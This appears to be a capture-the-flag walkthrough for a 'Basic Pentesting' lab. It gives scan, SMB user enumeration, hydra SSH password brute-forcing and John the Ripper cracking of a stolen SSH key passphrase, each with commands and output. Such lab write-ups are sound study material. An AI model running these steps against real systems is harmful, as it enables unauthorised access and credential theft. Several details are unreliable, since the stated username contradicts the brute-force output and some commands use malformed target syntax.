
# Basic Pentesting Walkthrough

## Task 1: Deploy the machine and connect to our network
**Answer**: No answer needed.

---

## Task 2: Find the services exposed by the machine
**Answer**: No answer needed.

**Command**:
```bash
nmap -sV http://[Target_Machine_Ip] -T5
```

**Nmap Scan Results**:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-03 15:14 EEST
Warning: 10.10.15.50 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.15.50
Host is up (0.085s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
20/tcp   filtered ftp-data
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
32/tcp   filtered unknown
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open     ajp13?
8080/tcp open     http-proxy?
8291/tcp filtered unknown
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.42 seconds
```

---

## Task 3: What is the name of the hidden directory on the web server (enter name without /)?
**Command**:
```bash
gobuster dir -u http://[Target_Machine_Ip] -w /usr/share/wordlists/dirb/big.txt
```

**Gobuster Scan Results**:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.50
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/development          (Status: 301) [Size: 316] [--> http://10.10.15.50/development/]
/server-status        (Status: 403) [Size: 299]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```
**Answer**: development

---

## Task 4: User brute-forcing to find the username & password
At this point, I will use the `enum4linux` tool to enumerate usernames from the target machine.

**Command**:
```bash
enum4linux -a [Target_Machine_IP]
```

This command specifically targets the usernames by leveraging SMB protocol enumeration.

**Results**:
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

---

## Task 5: What is the username?
**Answer**: kay

---

## Task 6: What is the password?
To find the password, we will perform a brute force attack using the hydra tool.

**Command**:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt http://[Target_Machine_IP] ssh
```

**Hydra Results**:
```
[22][ssh] host: 10.10.15.50   login: jan   password: armando
```

**Answer**: armando

---

## Task 7: What service do you use to access the server (answer in abbreviation in all caps)?
**Answer**: SSH

---

## Task 8: Enumerate the machine to find any vectors for privilege escalation
**Answer**: No answer needed.

---

## Task 9: What is the name of the other user you found (all lower case)?
**Answer**: jan

---

## Task 10: If you have found another user, what can you do with this information?
**Answer**: No answer needed.

---

## Task 11: What is the final password you obtain?
When attempting to read the pass.bak file located in kay's folder, we encounter a permission error.

To bypass this, we can use the private key in the kay folder.

**Steps**:
1. Retrieve the id_rsa key and save it as id_rsa.txt.
2. Use John The Ripper to crack the passphrase.

**Command**:
```bash
python3 /PATH/ssh2john.py id_rsa.txt > decrypted
sudo john decrypted --wordlist=/usr/share/wordlists/rockyou.txt
```

Eventually, the passphrase is **beeswax**.

**Final Password**: h____________________________________________________y$$
